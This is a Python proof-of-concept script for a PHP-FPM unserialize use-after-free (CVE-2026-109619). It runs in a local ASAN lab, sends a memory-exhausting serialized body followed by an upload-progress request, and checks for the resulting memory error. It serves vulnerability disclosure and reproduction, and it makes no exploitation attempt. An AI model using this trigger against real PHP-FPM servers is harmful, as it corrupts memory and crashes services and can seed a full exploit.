#!/usr/bin/env python3
"""PoC runner: CVE-2026-109619 Path C, post-RINIT BG(unserialize) residue on
PHP-FPM (Calif; local lab only).

WHAT THIS PROVES
  Request A (producer) is ordinary application code running AFTER startup:
  the lab-only /unserialize endpoint unserializes a request body large enough
  that the decoded-string allocation exceeds memory_limit mid-unserialize.
  The fatal unwinds through the normal request shutdown (the FPM worker
  SURVIVES) while PHP_VAR_UNSERIALIZE_DESTROY is skipped, leaving
  BG(unserialize).level > 0 with BG(unserialize).data pointing at memory freed
  by the request shutdown.
  Request B (consumer, same worker, no request in between) is a multipart
  upload-progress post whose parse-time session decode runs BEFORE the basic
  module RINIT, so php_var_unserialize_init() sees the stale level and reuses
  the freed context.

WHAT THIS DOES NOT DO
  No heap grooming, no pointer/address control, no code execution attempt.
  The forged session file needs local write access to the session save path.

Usage: python3 linux/poc-pathc.py --version 8.4.4 [--memory-limit 16M]
"""
import argparse
import json
import os
import re
import secrets
import signal
import socket
import subprocess
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from probe import Lab, multipart, worker_pid  # noqa: E402

REPO = Path(__file__).resolve().parents[1]
BASE = Path('/home/phplab/php-lab')
HTTP_PORT, FPM_PORT = 18085, 19085
SESSION_FIELD = 'PHPSESSID'
PROGRESS_FIELD = 'PHP_SESSION_UPLOAD_PROGRESS'


class PathCLab(Lab):
    """FpmLab with a larger nginx body cap for the runtime producer request."""

    def __init__(self, *args, memory_limit='16M', **kwargs):
        super().__init__(*args, **kwargs)
        self.memory_limit = memory_limit

    # FpmLab writes php.ini/nginx.conf in __init__; rewrite ours on top.
    def rewrite_configs(self):
        ini = (REPO / 'config/php.ini').read_text() + '\n'
        ini += ('session.upload_progress.min_freq=0\n'
                'memory_limit=%s\n'
                'post_max_size=64M\n'
                'session.save_path=%s\n'
                'upload_tmp_dir=%s\n'
                'error_log=%s\n' % (self.memory_limit, self.out / 'sessions',
                                     self.out / 'uploads', self.out / 'php-error.log'))
        (self.out / 'php.ini').write_text(ini)
        conf = (self.out / 'nginx.conf').read_text()
        conf = conf.replace('client_max_body_size 4m', 'client_max_body_size 64m')
        (self.out / 'nginx.conf').write_text(conf)


def asan_report(out, before):
    deadline = time.time() + 8
    while time.time() < deadline:
        for path in sorted(Path(out).glob('asan.*')):
            if path.name in before or not path.is_file():
                continue
            text = path.read_text(errors='replace')
            if 'AddressSanitizer' in text:
                frames = [line.strip() for line in text.splitlines()
                          if re.match(r'\s*#\d+', line)]
                return dict(file=str(path),
                            is_uaf='heap-use-after-free' in text,
                            has_unserialize_frames=any(
                                name in text for name in (
                                    'php_var_unserialize_init', 'tmp_var',
                                    'ps_srlzr_decode_php', 'var_unserializer')),
                            first_frames=frames[:8],
                            summary=next((line for line in text.splitlines()
                                          if 'SUMMARY' in line), ''))
        time.sleep(0.2)
    return None


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--version', default='8.4.4')
    parser.add_argument('--flavor', choices=['asan'], default='asan')
    parser.add_argument('--allocator', choices=['tracked'], default='tracked')
    parser.add_argument('--memory-limit', default='16M',
                        help='must let php://input load but fail inside the '
                             'decoded-string allocation of unserialize()')
    parser.add_argument('--body-mb', type=float, default=14.0)
    parser.add_argument('--iterations', type=int, default=3)
    args = parser.parse_args()

    summary_runs = []
    for iteration in range(1, args.iterations + 1):
        lab = PathCLab(args.version, args.flavor, args.allocator, 'on', [], 'pathc',
                       memory_limit=args.memory_limit)
        lab.rewrite_configs()
        record = dict(iteration=iteration, memory_limit=args.memory_limit)
        try:
            lab.start()
            # Warm-up: any request before A is fine (residue is created later).
            lab.request('/health')
            record['worker_pid_before'] = worker_pid(lab.out)

            # Producer A: runtime unserialize OOM (post-RINIT application code).
            payload_len = int(args.body_mb * 1024 * 1024)
            body = ('s:%d:"%s";' % (payload_len, 'A' * payload_len)).encode()
            req = urllib_request_build(body)
            try:
                with lab.opener.open(req, timeout=30) as res:
                    record['request_a_status'] = res.status
            except urllib.error.HTTPError as exc:
                record['request_a_status'] = exc.code
            except Exception as exc:
                record['request_a_status'] = None
                record['request_a_error'] = str(exc)
            time.sleep(0.5)
            log = (lab.out / 'php-error.log')
            log_text = log.read_text(errors='replace') if log.exists() else ''
            record['oom_logged'] = 'Allowed memory size of' in log_text
            record['fatal_in_unserialize'] = 'unserialize' in log_text
            record['worker_pid_after_a'] = worker_pid(lab.out)
            record['worker_survived_a'] = (record['worker_pid_after_a']
                                           == record['worker_pid_before'])
            if not (record['oom_logged'] and record['worker_survived_a']):
                record['result'] = ('oom_not_triggered' if not record['oom_logged']
                                    else 'worker_died_on_a')
                summary_runs.append(record)
                continue

            # Consumer B: parse-time decode on the same worker. No request in
            # between (any request would run basic RINIT and clear the residue).
            sid_small = 'pcsmall' + secrets.token_hex(8)
            (lab.out / 'sessions' / ('sess_' + sid_small)).write_text(
                'small|a:1:{i:0;i:7;}')
            asan_before = lab.asan_reports()
            try:
                res_b = multipart(HTTP_PORT, '/upload',
                                  fields=[(SESSION_FIELD, sid_small),
                                          (PROGRESS_FIELD, 'pcB')],
                                  file_spec=('file', 'b.bin', b'L' * 16384))
                record['request_b_status'] = res_b['status']
            except Exception as exc:
                record['request_b_status'] = None
                record['request_b_error'] = str(exc)
            time.sleep(0.5)
            report = asan_report(lab.out, set(asan_before))
            record['asan'] = report
            record['worker_pid_after_b'] = worker_pid(lab.out)
            if report and report['is_uaf'] and report['has_unserialize_frames']:
                record['result'] = 'path_c_reproduced'
            elif report:
                record['result'] = 'memory_error_other_path'
            else:
                record['result'] = 'no_uaf_observed'
            summary_runs.append(record)
        finally:
            lab.stop()

    reproduced = sum(1 for r in summary_runs if r.get('result') == 'path_c_reproduced')
    summary = dict(scope='local lab trigger PoC; no exploitation attempt',
                   version=args.version, target='php-fpm-single-worker',
                   memory_limit=args.memory_limit, body_mb=args.body_mb,
                   iterations=args.iterations, reproduced=reproduced,
                   runs=summary_runs,
                   iterations_detail=[dict(i=r['iteration'], a=r.get('request_a_status'),
                                           oom=r.get('oom_logged'),
                                           worker_survived_a=r.get('worker_survived_a'),
                                           b=r.get('request_b_status'),
                                           result=r.get('result'),
                                           summary=(r.get('asan') or {}).get('summary'))
                                      for r in summary_runs])
    out_dir = lab.out.parent / ('poc-pathc-%s-%s' % (time.strftime(
        '%Y%m%dT%H%M%S', time.gmtime()), args.version))
    # Evidence already lives in each iteration's probe dir; keep the summary
    # next to them.
    (lab.out.parent / ('poc-pathc-summary-%s-%s.json' % (
        time.strftime('%Y%m%dT%H%M%S', time.gmtime()), args.version))).write_text(
            json.dumps(summary, indent=2))
    print(json.dumps({k: summary[k] for k in ('version', 'iterations',
                                              'reproduced', 'iterations_detail')}, indent=2))
    return 0 if reproduced == args.iterations else 1


def urllib_request_build(body):
    return urllib.request.Request(
        'http://127.0.0.1:%d/unserialize' % HTTP_PORT, data=body,
        headers={'Content-Type': 'application/octet-stream'})


if __name__ == '__main__':
    sys.exit(main())
